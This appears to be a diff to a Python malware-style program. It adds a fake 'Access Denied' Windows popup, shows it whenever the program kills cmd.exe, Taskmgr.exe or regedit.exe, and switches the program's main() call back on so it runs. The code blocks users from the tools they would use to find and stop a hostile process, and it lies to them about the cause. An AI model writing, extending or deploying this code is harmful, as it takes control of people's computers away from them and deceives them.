@@ -4,6 +4,7 @@ import os
 import psutil
 import threading
 import sys
+import ctypes
 
 
 
@@ -65,6 +66,10 @@ class Dispatcher:
             return None
         
         
+def show_window() -> None:
+    ctypes.windll.user32.MessageBoxW(None, 'Access Denied', 'Windows')
+         
+        
         
 def kill_task_manager() -> None:
     processes = ['cmd.exe', 'Taskmgr.exe', 'regedit.exe']
@@ -76,6 +81,12 @@ def kill_task_manager() -> None:
         for process in all_process:
             if process.name() in processes:
                 process.kill()    
+                
+                window = threading.Thread(target=show_window)
+                window.start()
+                
+                
+        
     
 
 def main() -> None:
@@ -100,8 +111,7 @@ def main() -> None:
 
 
 if __name__ == '__main__':
-    # main()
-    ...
+    main()
         
     
     
